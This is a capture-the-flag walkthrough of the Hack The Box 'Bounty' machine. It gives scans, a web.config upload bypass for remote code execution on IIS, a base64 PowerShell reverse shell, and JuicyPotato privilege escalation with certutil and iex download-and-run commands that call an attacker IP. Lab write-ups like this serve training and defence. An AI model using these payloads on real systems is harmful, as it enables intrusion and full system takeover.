# Bounty: Easy

```sh
sudo vim /etc/hosts
# add bounty.htb

nmap -T4 -p- -A -Pn -v bounty.htb
```

* open ports & services:

    * 80/tcp: http: Microsoft IIS httpd 7.5

* checking the webpage on port 80, we have no info on the website except for an image of a wizard: the image file is named 'merlin.jpg'

* we can download the image file as it could contain any secrets or clues hidden inside it

* web enum:

    ```sh
    gobuster dir -u http://bounty.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,aspx,js -t 25
    # dir scan
    # .aspx extension included as the webpage is based on IIS

    gobuster dir -u http://bounty.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,aspx,js -t 25
    # using medium wordlist

    ffuf -c -u 'http://bounty.htb' -H 'Host: FUZZ.bounty.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 630 -s
    # subdomain scan

    feroxbuster -u http://bounty.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpg,ps1,aspx,js,docs,pdf,cgi,sql,xml,tar,gz,db --extract-links --scan-limit 3 --filter-status 400,404,405,500 --silent
    # recursive scan
    ```

* ```gobuster``` & ```feroxbuster``` find a few pages:

    * /aspnet_client: 403 Forbidden
    * /transfer.aspx: a file upload form
    * /uploadedfiles: 403 Forbidden
    * /aspnet_client/system_web: 403 Forbidden

* the '/transfer.aspx' has a simple upload form; the source code does not reveal much but indicates some file validation event is used

* the '/uploadedfiles' directory cannot be accessed, but it is possible that the file uploaded by the form could be stored in this directory

* we can upload a test file like the image file saved earlier from the homepage

* intercepting the request using Burp Suite, we can see that the upload action is a POST call to '/transfer.aspx' with the file data; and the file is uploaded successfully

* checking if we can access the uploaded '.jpg' file in the '/uploadedfiles' directory, if we navigate to 'http://bounty.htb/uploadedfiles/merlin.jpg', we can see that the file gets uploaded as the image file is found with the same name

* the image file gets deleted from the uploads directory in a few minutes though, so we need to check the file immediately after uploading

* if we try to upload a webshell '.aspx' file, we get a server error page and errors like 'invalid file. please try again'; and the uploads directory does not show this file

* trying case-insensitive extensions like '.asPX' or '.ASPX' also do not work and we get the same error

* Googling for IIS Server file upload bypass techniques includes uploading 'web.config' files to overwrite the existing config file

* we can confirm this by uploading a mock file 'test.config': and the upload works

* Googling for 'web.config' file uploads with ASPX or for command execution leads to [this blog which shows RCE methods with web.config files](https://soroush.me/blog/uploading-web-config-for-fun-and-profit-2):

    * we can test with the following 'web.config' file upload to test if command execution works:

        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <configuration>
        <system.webServer>
            <handlers accessPolicy="Read, Script, Write">
                <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />        
            </handlers>
            <security>
                <requestFiltering>
                    <fileExtensions>
                    <remove fileExtension=".config" />
                    </fileExtensions>
                    <hiddenSegments>
                    <remove segment="web.config" />
                    </hiddenSegments>
                </requestFiltering>
            </security>
        </system.webServer>
        </configuration>
        <!-- ASP code comes here! It should not include HTML comment closing tag and double dashes! 
        <%
        Response.write("-"&"->")
        ' it is running the ASP code if you can see 3 by opening the web.config file!
        Response.write(1+2)
        Response.write("<!-"&"-")
        %>
        -->
        ```
    
    * after uploading the above 'web.config' file, if we navigate to '/uploadedfiles/web.config', we can see the value '3' is shown: which means the expression was evaluated, and RCE is possible

    * now we can inject our ASP code following the same format as before: to be included in the comments part at the end

    * we can refer the ASP shell code from ```/usr/share/laudanaum``` or Google for RCE 'web.config' files to get the format:

        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <configuration>
        <system.webServer>
            <handlers accessPolicy="Read, Script, Write">
                <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />        
            </handlers>
            <security>
                <requestFiltering>
                    <fileExtensions>
                    <remove fileExtension=".config" />
                    </fileExtensions>
                    <hiddenSegments>
                    <remove segment="web.config" />
                    </hiddenSegments>
                </requestFiltering>
            </security>
        </system.webServer>
        </configuration>
        <!-- ASP code comes here! It should not include HTML comment closing tag and double dashes! 
        <%
        Response.write("-"&"->")
        Dim oShell, sCommand
        sCommand = "ping -n 4 10.10.14.95"
        Set oShell = Server.CreateObject("WScript.Shell")
        oShell.Run sCommand, , True
        Set oShell = Nothing
        Response.write("<!-"&"-")
        %>
        -->
        ```
    
    * we can test with the ```ping -n 4 10.10.14.95``` command instead of standard commands to check for RCE: setup a listener using ```sudo tcpdump -i tun0 icmp``` to check for ICMP packets

    * once we upload this file and navigate to '/uploadedfiles/web.config', we can see the ping packets are hitting the listener: indicating the command execution works

    * for reverse shell, we can use the PowerShell reverse-shell one-liner:

        ```sh
        pwsh
        # powershell in attacker

        $Text = '$client = New-Object System.Net.Sockets.TCPClient("10.10.14.95",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

        $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

        $EncodedText =[Convert]::ToBase64String($Bytes)

        $EncodedText
        # base64-encoded reverse-shell one-liner

        exit

        nc -nvlp 4444
        # setup listener
        ```
    
    * once the base64-encoded payload is generated, we can use it in the 'web.config' file in the command ```powershell -enc <base64-payload>```

    * using the prepared 'web.config' file, if we upload it and navigate to 'http://bounty.htb/uploadedfiles/web.config', we get a reverse shell on our listener

* in reverse shell:

    ```ps
    whoami
    # bounty\merlin

    cd C:\Users

    ls
    # we have only one standard user 'merlin'

    cd C:\Users\merlin

    ls

    type C:\Users\merlin\Desktop\user.txt
    # user flag

    whoami /priv
    ```

* ```whoami /priv``` shows we have multiple privileges: and this includes 'SeImpersonatePrivilege' enabled

* we can abuse this privilege using the 'JuicyPotato' exploit; we can use this exploit and the PowerShell reverse-shell script:

    ```sh
    # on attacker
    # download 'JuicyPotato.exe' and 'Invoke-PowerShellTcp.ps1'

    echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.95 -Port 5555" >> Invoke-PowerShellTcp.ps1
    # update the PowerShell script to add the reverse-shell one-liner

    echo "powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.95:8000/Invoke-PowerShellTcp.ps1')" > shell.bat
    # prepare the batch script to fetch the reverse-shell script

    python3 -m http.server

    nc -nvlp 5555
    # listener to catch root reverse shell
    ```

    ```sh
    # in reverse shell as 'merlin'

    certutil -urlcache -f http://10.10.14.95:8000/JuicyPotato.exe jp.exe

    certutil -urlcache -f http://10.10.14.95:8000/shell.bat shell.bat

    # download and run the exploit

    .\jp.exe -t * -p shell.bat -l 4444
    # this gives a shell on our listener
    ```

* in new reverse shell:

    ```sh
    whoami
    # 'nt authority\system'

    type C:\Users\Administrator\Desktop\root.txt
    # root flag
    ```
